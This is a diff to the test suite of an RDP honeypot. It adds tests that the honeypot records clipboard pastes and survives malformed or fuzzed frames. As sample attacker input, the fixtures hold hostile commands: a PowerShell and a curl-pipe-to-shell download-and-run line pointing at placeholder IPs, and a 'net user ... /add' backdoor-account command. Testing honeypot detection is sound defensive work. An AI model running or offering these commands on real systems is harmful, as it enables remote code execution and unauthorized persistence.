@@ -72,13 +72,13 @@ async def _serve(tmp_path, monkeypatch, config=None, name="rdp-sess"):
     return engine, container, port
 
 
-async def _connect(port: int, user: str, password: str, *, nla: bool):
+async def _connect(port: int, user: str, password: str, *, nla: bool, channels=None):
     from aardwolf.commons.factory import RDPConnectionFactory
     from aardwolf.commons.iosettings import RDPIOSettings
     from aardwolf.commons.queuedata.constants import VIDEO_FORMAT
 
     settings = RDPIOSettings()
-    settings.channels = []
+    settings.channels = [] if channels is None else channels
     settings.video_width, settings.video_height = 1024, 768
     settings.video_bpp_min, settings.video_bpp_max = 15, 32
     settings.video_out_format = VIDEO_FORMAT.PIL
@@ -113,20 +113,35 @@ async def _click(connection, x: int, y: int) -> None:
     await connection.ext_in_queue.put(mouse)
 
 
-async def _events(event_type: str, wait: float = 2.5) -> list:
+async def _events(event_type: str, wait: float = 10.0) -> list:
+    """Alerts of one type, polled gently. The test database is one shared in-memory SQLite
+    connection: a SELECT issued while the flusher commits raises `cannot commit transaction -
+    SQL statements in progress`, the flusher retries for ~1.5 s and then drops the batch, which
+    looked like a lost `rdp_session` event whenever the suite was under load. So each poll
+    waits for the buffer to go idle first, and a collision is retried, not fatal."""
     from sqlalchemy import select
+    from sqlalchemy.exc import OperationalError
 
+    from honeypot_mcp.storage import event_buffer
     from honeypot_mcp.storage.database import get_session
     from honeypot_mcp.storage.models import Alert
 
     deadline = asyncio.get_event_loop().time() + wait
     while True:
-        async with get_session() as session:
-            rows = (await session.execute(select(Alert))).scalars().all()
+        for _ in range(100):
+            if event_buffer.get_buffer().qsize() == 0:
+                break
+            await asyncio.sleep(0.05)
+        await asyncio.sleep(0.3)  # the batch just taken off the queue may still be writing
+        try:
+            async with get_session() as session:
+                rows = (await session.execute(select(Alert))).scalars().all()
+        except OperationalError:
+            rows = []
         found = [a for a in rows if a.event_type == event_type]
         if found or asyncio.get_event_loop().time() > deadline:
             return found
-        await asyncio.sleep(0.2)
+        await asyncio.sleep(0.3)
 
 
 def _weak(name: str = "rdp-sess") -> tuple[str, str]:
@@ -375,8 +390,9 @@ async def test_the_session_loop_survives_hostile_frames_and_stays_bounded():
         assert sink.written < 4 * 1024 * 1024, seed
 
 
+@pytest.mark.parametrize("with_clipboard", [False, True], ids=["plain", "clipboard"])
 async def test_mutating_a_real_recorded_session_never_breaks_the_session_loop(
-    tmp_path, monkeypatch
+    tmp_path, monkeypatch, with_clipboard
 ):
     """Random bytes rarely get past the first check. A real client's frames do: record them
     from an actual aardwolf login, then replay thousands of corrupted variants (flipped
@@ -398,9 +414,19 @@ async def test_mutating_a_real_recorded_session_never_breaks_the_session_loop(
     engine, container, port = await _serve(tmp_path, monkeypatch)
     try:
         user, password = _weak()
-        connection, error = await _connect(port, user, password, nla=False)
+        channels = None
+        if with_clipboard:
+            from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel
+
+            channels = [RDPECLIPChannel]
+        connection, error = await _connect(port, user, password, nla=False, channels=channels)
         assert error is None, error
         await asyncio.sleep(0.6)
+        if with_clipboard:
+            from aardwolf.commons.queuedata.clipboard import RDP_CLIPBOARD_DATA_TXT
+
+            await connection.ext_in_queue.put(RDP_CLIPBOARD_DATA_TXT("whoami /priv"))
+            await asyncio.sleep(0.8)
         await _type(connection, "net user\n")
         await _click(connection, 40, 40)
         await asyncio.sleep(0.6)
@@ -608,3 +634,118 @@ async def test_refresh_rect_is_rate_limited_and_total_output_is_capped():
     # the first desktop plus at most MAX_REFRESHES more
     assert written < (MAX_REFRESHES + 2) * 2_500_000
     assert written < MAX_OUTPUT_BYTES + 2_500_000
+
+
+# ── clipboard (MS-RDPECLIP) ──────────────────────────────────────────────────
+
+
+def _clip_message(msg_type: int, flags: int, data: bytes) -> bytes:
+    import struct
+
+    return struct.pack("<HHI", msg_type, flags, len(data)) + data
+
+
+def _as_chunk(message: bytes, *, first=True, last=True, total=None) -> bytes:
+    import struct
+
+    flags = 0x10 | (1 if first else 0) | (2 if last else 0)
+    return struct.pack("<II", len(message) if total is None else total, flags) + message
+
+
+def _format_list(*ids: int) -> bytes:
+    import struct
+
+    return _clip_message(2, 0, b"".join(struct.pack("<I", i) + bytes(32) for i in ids))
+
+
+async def test_the_clipboard_conversation_asks_for_text_and_records_it():
+    import struct
+
+    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel
+
+    channel = ClipboardChannel()
+    opening = channel.opening()
+    assert struct.unpack_from("<HH", opening[0]) == (7, 0) and struct.unpack_from(
+        "<H", opening[1]
+    ) == (1,)
+
+    replies = channel.feed(_as_chunk(_format_list(13, 1, 0xC001)))
+    assert [struct.unpack_from("<HH", r)[0] for r in replies] == [3, 4]  # accepted, then asked
+    assert struct.unpack_from("<I", replies[1], 8)[0] == 13  # for Unicode text
+
+    text = "powershell -nop -c iex(iwr http://198.51.100.9/a)".encode("utf-16-le") + b"\x00\x00"
+    assert channel.feed(_as_chunk(_clip_message(5, 1, text))) == []
+    assert channel.texts == ["powershell -nop -c iex(iwr http://198.51.100.9/a)"]
+    assert {13, 1, 0xC001} <= channel.formats_seen
+
+
+async def test_clipboard_messages_may_arrive_in_pieces_and_garbage_is_ignored():
+    from honeypot_mcp.engines.rdp_cliprdr import MAX_MESSAGE, ClipboardChannel
+
+    channel = ClipboardChannel()
+    channel.feed(_as_chunk(_format_list(1)))  # plain ANSI text this time
+    body = _clip_message(5, 1, b"net user hax P@ss /add\x00")
+    channel.feed(_as_chunk(body[:10], last=False, total=len(body)))
+    channel.feed(_as_chunk(body[10:], first=False, total=len(body)))
+    assert channel.texts == ["net user hax P@ss /add"]
+
+    for junk in (b"", b"\x01", _as_chunk(b"\x00" * 3), _as_chunk(b"x" * 20, first=False)):
+        assert channel.feed(junk) == []
+    assert channel.feed(_as_chunk(b"y" * 8, total=MAX_MESSAGE + 1)) == []  # refused up front
+    assert channel.feed(_as_chunk(_clip_message(5, 1, b"short"), total=2)) == []  # lies about size
+
+
+async def test_a_request_for_the_servers_clipboard_is_declined_and_recording_is_bounded():
+    import struct
+
+    from honeypot_mcp.engines.rdp_cliprdr import MAX_TEXT_CHARS, MAX_TEXTS, ClipboardChannel
+
+    channel = ClipboardChannel()
+    [reply] = channel.feed(_as_chunk(_clip_message(4, 0, struct.pack("<I", 13))))
+    assert struct.unpack_from("<HH", reply) == (5, 2)  # a data response marked as failed
+
+    for n in range(MAX_TEXTS + 10):
+        channel.feed(_as_chunk(_format_list(13)))
+        big = (f"paste {n} " + "A" * (MAX_TEXT_CHARS * 2)).encode("utf-16-le") + b"\x00\x00"
+        channel.feed(_as_chunk(_clip_message(5, 1, big)))
+    assert len(channel.texts) == MAX_TEXTS
+    assert all(len(t) <= MAX_TEXT_CHARS for t in channel.texts)
+
+
+async def test_pasted_text_is_recorded_with_control_characters_defanged():
+    from honeypot_mcp.engines.rdp_cliprdr import ClipboardChannel
+
+    channel = ClipboardChannel()
+    channel.feed(_as_chunk(_format_list(13)))
+    nasty = "ok\x1b[31m\x07line\r\nnext".encode("utf-16-le") + b"\x00\x00"
+    channel.feed(_as_chunk(_clip_message(5, 1, nasty)))
+    assert channel.texts == ["ok?[31m?line\r\nnext"]
+
+
+async def test_a_real_client_pasting_into_the_session_is_recorded(tmp_path, monkeypatch):
+    """aardwolf negotiates the clipboard channel like mstsc and FreeRDP do; text copied on its
+    side is announced, requested by the honeypot, and recorded with an event of its own."""
+    from aardwolf.commons.queuedata.clipboard import RDP_CLIPBOARD_DATA_TXT
+    from aardwolf.extensions.RDPECLIP.channel import RDPECLIPChannel
+
+    engine, container, port = await _serve(tmp_path, monkeypatch)
+    try:
+        user, password = _weak()
+        connection, error = await _connect(
+            port, user, password, nla=True, channels=[RDPECLIPChannel]
+        )
+        assert error is None, error
+        await asyncio.sleep(1.0)  # the server opens the conversation once the desktop is up
+        await connection.ext_in_queue.put(
+            RDP_CLIPBOARD_DATA_TXT("curl -s http://203.0.113.7/x.sh | sh")
+        )
+        await asyncio.sleep(1.5)
+        await connection.terminate()
+
+        [pasted] = await _events("rdp_clipboard")
+        assert pasted.payload["text"] == "curl -s http://203.0.113.7/x.sh | sh"
+        assert pasted.severity.value == "high"
+        [session] = await _events("rdp_session")
+        assert session.payload["clipboard"] == ["curl -s http://203.0.113.7/x.sh | sh"]
+    finally:
+        await engine.stop(container)
